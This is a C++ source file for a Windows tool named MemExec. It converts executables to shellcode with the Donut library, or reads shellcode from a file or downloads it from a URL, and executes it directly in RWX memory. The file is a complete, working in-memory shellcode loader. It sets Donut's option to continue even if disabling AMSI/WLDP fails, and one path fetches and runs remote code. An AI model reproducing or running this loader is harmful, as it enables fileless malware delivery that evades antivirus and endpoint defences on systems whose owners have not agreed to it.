// pisc_exec.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "HTTPRequest.hpp"
#include "cxxopts.hpp"

#include <iostream>
#include <Windows.h>
#include <String.h>
#include <donut.h>
#include <fstream>

using namespace std;

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "donut.lib")

static void write_shellcode_to_file(const void* object, size_t size, string outfile) {
#ifdef __cplusplus
    const unsigned char* const bytes = static_cast<const unsigned char*>(object);
#else // __cplusplus
    const unsigned char* const bytes = object;
#endif // __cplusplus

    size_t i;
    ofstream myfile;
    myfile.open(outfile, ios::out | ios::binary);

    for (i = 0; i < size; i++) {
        myfile << bytes[i];
    }

    myfile.close();
}

static void execute_shellcode(void *scode, size_t slen) {
    try {
        
        void* exec = VirtualAlloc(0, slen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(exec, scode, slen);
        ((void(*)())exec)();
        
    }
    catch (const std::exception & ex) {
        std::cerr << ex.what() << std::endl;
    }
}

int main(int argc, char* argv[]) {
    DONUT_CONFIG c;
    int          err;

    
    //parse arguments
    cxxopts::Options options("MemExec.exe", "Execute Program/ShellCode in memory.");
    options.positional_help("[optional args]").show_positional_help();

    options.add_options()
        ("h,help", "Print help")
        ("f,file", "Path to executable", cxxopts::value<std::string>())
        ("a,args", "Arguments for executable", cxxopts::value<std::string>())
        ("o,output", "Write shellcode to file", cxxopts::value<std::string>())
        ("s,shellcode", "Path to shellcode", cxxopts::value<std::string>())
        ("u,url", "Download shellcode from url", cxxopts::value<std::string>())
        ("v,verbose", "Verbose debug statements", cxxopts::value<bool>()->default_value("false"))
        ;

    auto resultargs = options.parse(argc, argv);

    if (argc < 1) {
        std::cout << options.help({ "" }) << std::endl;
        std::exit(0);
    }

    if (resultargs.count("help")) {
        std::cout << options.help({ "" }) << std::endl;
        std::exit(0);
    }

    if (resultargs.count("file")) {
        memset(&c, 0, sizeof(c));

        if (resultargs.count("verbose")) {
            std::cout << "File path [Executable]: " << resultargs["file"].as<std::string>() << std::endl;
        }
        // copy input file
        lstrcpynA(c.file, (LPCSTR)resultargs["file"].as<std::string>().c_str(), DONUT_MAX_NAME - 1);

        // default settings
        c.inst_type = DONUT_INSTANCE_PIC;   // file is embedded
        c.arch = DONUT_ARCH_X84;         // dual-mode (x86+amd64)
        c.bypass = DONUT_BYPASS_CONTINUE;  // continues loading even if disabling AMSI/WLDP fails
        c.mod_type = DONUT_MODULE_EXE;    // default output format

        // generate the shellcode
        err = DonutCreate(&c);
        if (err != DONUT_ERROR_SUCCESS) {
            cout << " Donut Error : " << err << "\n";
            return 0;
        }

        // Shellcode Info
        if (resultargs.count("verbose")) {
            cout << "Shellcode was generated";
            cout << "Length of Shellcode : " << c.pic_len << "\n";
            cout << "Shellcode located at : " << c.pic << "\n";
            if (resultargs.count("args")) {
                cout << "Arguments passed to shellcode : " << resultargs["args"].as<std::string>()  << "\n";
            }
        }

        //Write Shellcode to File
        if (resultargs.count("output")) {
            write_shellcode_to_file(c.pic, (size_t) c.pic_len, resultargs["output"].as<std::string>());
            if (resultargs.count("verbose")) {
                cout << "Shellcode written to file : " << resultargs["output"].as<std::string>() << "\n";
            }
        }

        //Execute ShellCode
        execute_shellcode(c.pic, (size_t)c.pic_len+10);

               
        DonutDelete(&c);

        std::exit(0);
    }

    if (resultargs.count("shellcode")) {
        if (resultargs.count("verbose")) {
            std::cout << "File path [Shellcode]: " << resultargs["shellcode"].as<std::string>() << std::endl;
        }
        //read shellcode file
        ifstream readfile;
        readfile.open(resultargs["shellcode"].as<std::string>(), ios::in | ios::binary);
        
        //check length of shellcode
        readfile.seekg(0, ios::end);
        size_t scsize = (size_t) readfile.tellg();
        readfile.seekg(0, ios::beg);
        
        //read shellcode from file
        char* buffer = new char[scsize];
        readfile.read(buffer, scsize);
        readfile.close();

        if (resultargs.count("verbose")) {
            cout << "Shellcode was generated";
            cout << "Length of Shellcode : " << scsize << "\n";
            cout << "Shellcode located at : " << &buffer << "\n";
            if (resultargs.count("args")) {
                cout << "Arguments passed to shellcode : " << resultargs["args"].as<std::string>() << "\n";
            }
        }
        
        //execute shellcode
        execute_shellcode(buffer, scsize);

        std::exit(0);
    }

    if (resultargs.count("url")) {
        try
        {
            if (resultargs.count("verbose")) {
                cout << "Sending GET Request : " << resultargs["url"].as<std::string>() << "\n";
            }
            // you can pass http::InternetProtocol::V6 to Request to make an IPv6 request
            http::Request request{ resultargs["url"].as<std::string>() };

            // send a get request
            const auto response = request.send("GET");
            
            if (resultargs.count("verbose")) {
                    cout << "HTTP response status : " << response.status << "\n";
                    cout << "HTTP content [location] : "<< &response << '\n';
            }

            if (resultargs.count("output")) {
                write_shellcode_to_file(response.body.data(), response.body.size(), resultargs["output"].as<std::string>());
                if (resultargs.count("verbose")) {
                    cout << "Shellcode written to file : " << resultargs["output"].as<std::string>() << "\n";
                }
            }

            execute_shellcode( (void* )response.body.data(), response.body.size() );

        }
        catch (const std::exception& e)
        {
            std::cerr << "Request failed, error: " << e.what() << '\n';
        }

        std::exit(0);
    }

    return 0;

}
